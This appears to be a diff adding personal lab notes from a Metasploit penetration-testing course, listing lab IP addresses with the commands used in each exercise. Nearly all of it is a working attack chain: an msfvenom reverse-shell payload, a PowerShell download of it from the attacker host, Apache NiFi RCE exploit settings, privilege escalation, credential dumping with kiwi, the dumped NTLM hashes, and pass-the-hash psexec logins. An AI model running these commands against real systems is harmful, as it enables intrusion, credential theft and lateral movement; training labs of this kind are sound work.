@@ -1,0 +1,89 @@
+192.168.148.202
+
+The Metasploit Framework - Auxiliary Modules - VM #2 OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.148.201
+
+The Metasploit Framework - Auxiliary Modules - VM #1 OS Credentials:
+
+db_nmap -A 192.168.148.202
+
+
+
+
+
+192.168.148.223
+
+The Metasploit Framework - Core Meterpreter Post-Exploitation Features - VM #1 OS Credentials:
+
+msfvenom -p windows/x64/meterpreter_reverse_https LHOST=192.168.45.186 LPORT=443 -f exe -o met.exe
+
+iwr -uri http://192.168.45.186/met.exe -Outfile met.exe
+
+
+
+192.168.148.225
+
+The Metasploit Framework - Capstone Exercise - VM #1 OS Credentials:
+
+No credentials were provided for this machine
+
+192.168.148.226
+
+The Metasploit Framework - Capstone Exercise - VM #2 OS Credentials:
+
+
+
+
+msf6 exploit(multi/http/apache_nifi_processor_rce) > show options
+
+Module options (exploit/multi/http/apache_nifi_processor_rce):
+
+   Name          Current Setting  Required  Description
+   ----          ---------------  --------  -----------
+   BEARER-TOKEN                   no        JWT authenticate with
+   DELAY         5                yes       The delay (s) before stopping and deleting the processor
+   PASSWORD                       no        Password to authenticate with
+   Proxies                        no        A proxy chain of format type:host:port[,type:host:port][...]
+   RHOSTS        192.168.133.225  yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
+   RPORT         8080             yes       The target port (TCP)
+   TARGETURI     /                yes       The base path
+   USERNAME                       no        Username to authenticate with
+   VHOST                          no        HTTP server virtual host
+
+
+Payload options (cmd/windows/powershell/x64/meterpreter/reverse_tcp):
+
+   Name      Current Setting  Required  Description
+   ----      ---------------  --------  -----------
+   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
+   LHOST     192.168.45.194   yes       The listen address (an interface may be specified)
+   LPORT     4444             yes       The listen port
+
+
+Exploit target:
+
+   Id  Name
+   --  ----
+   1   Windows (In-Memory)
+
+add also set SSL false and set ForceExploit true , the rest looks good
+
+getsystem
+
+load kiwi
+
+creds_all
+
+Username     Domain  NTLM                              SHA1
+--------     ------  ----                              ----
+alex         ITWK03  5391f1724568f48a4aadba748109864c  3c0c8334c4b5a80345d40e00550539a7c847809c
+itwk04admin  ITWK03  445414c16b5689513d4ad8234391aacf  3b25183b0c39fd03069f586c7d238160f54b6cd7
+offsec       ITWK03  b26462f877427f4f6a87605d587ac60d  f237f7e3b1958e6047f1b29716a2f776dbdb5a19
+
+impacket-psexec 'alex:5391f1724568f48a4aadba748109864c'@192.168.148.226
+impacket-psexec 'itwk04admin:445414c16b5689513d4ad8234391aacf'@192.168.148.226
+impacket-psexec 'offsec:b26462f877427f4f6a87605d587ac60d'@192.168.148.226
+impacket-psexec -hashes :445414c16b5689513d4ad8234391aacf ITWK03/itwk04admin@192.168.148.226
